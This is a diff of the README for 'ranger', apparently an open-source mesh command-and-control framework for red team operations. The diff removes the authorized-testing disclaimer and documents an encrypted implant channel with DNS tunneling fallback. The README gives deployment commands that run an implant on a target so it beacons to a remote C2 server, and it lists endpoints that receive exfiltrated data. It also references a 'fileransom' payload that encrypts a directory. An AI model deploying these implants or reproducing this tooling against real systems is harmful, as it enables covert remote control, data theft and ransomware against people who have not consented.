@@ -1,6 +1,7 @@
-# Ranger C3 v3.0.0
+# ranger
 
-**Distributed Multi-Node Mesh C2 Framework**
+Distributed multi-node mesh C2 framework
+`github.com/saviorSEC/ranger`.
 
 ```
   ██████  █████  ███    ██  ██████  ███████ ██████  
@@ -10,9 +11,7 @@
   ██   ██ ██   ██ ██   ████  ██████  ███████ ██   ██ 
 ```
 
-**Ranger C3** is a distributed, multi-node Command & Control framework built for red team operations. It features a P2P mesh topology for resilience, encrypted WebSocket C2 channels, DNS tunneling fallback, a full operator web dashboard, and a library of native Go payload modules.
-
-**DISCLAIMER** FOR EDUCATIONAL PURPOSES AND AUTHORIZED SECURITY TESTING ONLY.
+**ranger** is a distributed, multi-node Command & Control framework built for red team operations. It features a P2P mesh topology for resilience, an encrypted implant channel, DNS tunneling fallback, AEAD-enveloped REST fallback, a full operator web dashboard, and a library of native Go payload modules.
 
 ---
 
@@ -21,12 +20,13 @@
 | Capability | Description |
 |---|---|
 | Mesh topology | Distributed C2 nodes with P2P heartbeat — no single point of failure |
-| Primary channel | WebSocket over HTTP/2 with XChaCha20-Poly1305 encrypted frames |
-| Fallback channels | HTTPS REST beacon + DNS tunneling (base32 + AEAD) |
+| Primary channel | WebSocket over HTTP/2 with XChaCha20-Poly1305 encrypted frames (shared session key) |
+| Fallback channels | AEAD-enveloped HTTPS REST beacon/result + DNS tunneling (base32 + AEAD) |
+| Mesh integrity | Ed25519-signed heartbeats verified against mTLS peer certificates |
 | Operator dashboard | Full SPA web UI — clickable implant drill-down, interactive shell, payload executor |
-| Payload system | 23 native Go payload modules — compiled, no Python needed at runtime |
-| Crypto | Ed25519 signing, XChaCha20-Poly1305 AEAD, SHA-256 key derivation |
-| Auth | JWT-based operator authentication with token expiry |
+| Payload system | 24 native Go payload modules — compiled, no Python needed at runtime |
+| Crypto | Ed25519 signing, XChaCha20-Poly1305 AEAD, SHA-256 key derivation, shared session key via `-key` |
+| Auth | bcrypt or constant-time password check, JWT sessions with expiry |
 | Persistence | SQLite (WAL mode, concurrent) |
 
 ---
@@ -61,8 +61,9 @@
 
 ### Crypto Stack
 
-- **Signing**: Ed25519 with timestamp + nonce replay protection
-- **Session encryption**: XChaCha20-Poly1305 AEAD
+- **Signing**: Ed25519 with timestamp + nonce replay protection; mesh heartbeats signed per node
+- **Session encryption**: XChaCha20-Poly1305 AEAD with an operator-set session key
+- **REST fallback**: AEAD envelope (`{"data": b64(nonce||ct)}`) - no plaintext implant traffic
 - **Key derivation**: SHA-256 with domain separation
 - **TLS**: Optional mTLS between mesh peers
 
@@ -88,10 +89,12 @@ make payloads    # Build standalone payload binaries
 ### 2. Start C2
 
 ```bash
-# Basic (self-signed TLS, standalone)
+# Basic (self-signed TLS, standalone). Set a session key so implants can
+# encrypt; omit -key and the server generates and prints one.
 ./build/ranger-c2 \
   --listen :4443 \
   --password "opsec" \
+  --key 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef \
   --db data/c2.db \
   --gen-certs
 
@@ -101,8 +104,12 @@ make payloads    # Build standalone payload binaries
   --mesh :9000 \
   --bootstrap "10.0.0.2:9000,10.0.0.3:9000" \
   --password "opsec" \
+  --key 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef \
   --db data/c2.db \
   --gen-certs
+
+# Password may be a plaintext secret or a bcrypt hash ($2a/$2b/$2y prefix).
+# TLS key file flag is --tls-key (--key is the implant session key).
 ```
 
 ### 3. Access Dashboard
@@ -116,16 +123,18 @@ Login with the password you set. The dashboard auto-refreshes every 12 seconds.
 ### 4. Deploy Implant
 
 ```bash
-# On target:
+# On target (must match the server session key):
 ./build/implant \
   --c2 wss://your-c2:4443/ws \
+  --key 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef \
   --beacon-min 60 \
   --beacon-max 300
 
 # With DNS fallback
 ./build/implant \
   --c2 wss://your-c2:4443/ws \
-  --dns-domain "rogue-c2.example.com" \
+  --key 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef \
+  --dns-domain "c2.example.com" \
   --beacon-min 120 \
   --beacon-max 600
 ```
@@ -262,14 +271,17 @@ go run ./cmd/payloads fileransom --arg dir=/tmp/test --arg action=encrypt
 
 ## API Reference
 
-### Implant Endpoints (unauthenticated)
+### Implant Endpoints
 
 | Method | Path | Description |
 |--------|------|-------------|
 | WebSocket | `/ws` | Primary implant channel (upgrade + encrypted binary frames) |
-| POST | `/api/v1/beacon` | Fallback HTTP beacon — body: `BeaconPayload` JSON |
-| POST | `/api/v1/result` | Task result submission — body: `TaskResult` JSON |
-| Any | `/dns/<id>/<type>` | DNS exfil reception — raw body as exfil data |
+| POST | `/api/v1/beacon` | Fallback HTTP beacon - AEAD envelope `{"data": b64(nonce||ct)}` |
+| POST | `/api/v1/result` | Task result submission - AEAD envelope `{"data": b64(nonce||ct)}` |
+| Any | `/dns/<id>/<type>` | DNS exfil reception - raw body as exfil data |
+
+Implant REST traffic is encrypted with the shared session key; plaintext
+bodies are rejected.
 
 ### Operator API (JWT-authenticated)
 
@@ -299,6 +311,31 @@ go run ./cmd/payloads fileransom --arg dir=/tmp/test --arg action=encrypt
 
 ---
 
+## Project Structure
+
+```
+ranger/
+├── cmd/
+│   ├── c2/              # C2 server entry point
+│   ├── stager/          # Stager binary entry point
+│   └── payloads/        # Standalone payload CLI
+├── internal/
+│   ├── api/             # HTTP/WS server, routes, embedded dashboard
+│   ├── crypto/          # Ed25519, XChaCha20-Poly1305, key derivation
+│   ├── dns/             # DNS tunnel client
+│   ├── implantpkg/      # Core implant logic (beacon, exec, execPayload)
+│   ├── mesh/            # P2P mesh networking
+│   ├── protocol/        # Shared types (beacon, task, result, implant, mesh)
+│   ├── store/           # SQLite database layer
+│   └── payloads/        # 24 native Go payload modules
+├── payloads/            # Legacy Python payloads (deprecated)
+├── deploy.sh            # Deployment script
+├── go.mod / go.sum
+└── README.md
+```
+
+---
+
 ## Command-Line Flags
 
 ### C2 Server (`./build/ranger-c2`)
@@ -309,8 +346,9 @@ go run ./cmd/payloads fileransom --arg dir=/tmp/test --arg action=encrypt
 | `--mesh` | `""` | P2P mesh listen address (empty = no mesh) |
 | `--bootstrap` | `""` | Comma-separated bootstrap mesh peers |
 | `--db` | `data/c2.db` | SQLite database path |
-| `--password` | `""` | Dashboard login password |
-| `--cert` / `--key` | `""` | TLS certificate and key files |
+| `--password` | `""` | Dashboard login password (plaintext or bcrypt hash) |
+| `--key` | auto | Implant session key (64 hex chars); generated and printed when omitted |
+| `--cert` / `--tls-key` | `""` | TLS certificate and key files |
 | `--gen-certs` | `false` | Generate self-signed TLS certs |
 | `--id` | auto | C2 node identifier |
 
@@ -319,9 +357,11 @@ go run ./cmd/payloads fileransom --arg dir=/tmp/test --arg action=encrypt
 | Flag | Default | Description |
 |------|---------|-------------|
 | `--c2` | required | C2 WebSocket URL (e.g., `wss://host:4443/ws`) |
+| `--key` | auto | Session key hex - must match the C2 server |
 | `--dns-domain` | `""` | DNS tunneling fallback domain |
 | `--beacon-min` | `60` | Minimum beacon interval (seconds) |
 | `--beacon-max` | `300` | Maximum beacon interval (seconds) |
 | `--debug` | `false` | Enable verbose logging |
 
-<img width="866" height="150" alt="image13" src="https://github.com/user-attachments/assets/3bffe6ec-1021-4e37-8805-9390039eb8d0" />
+
+
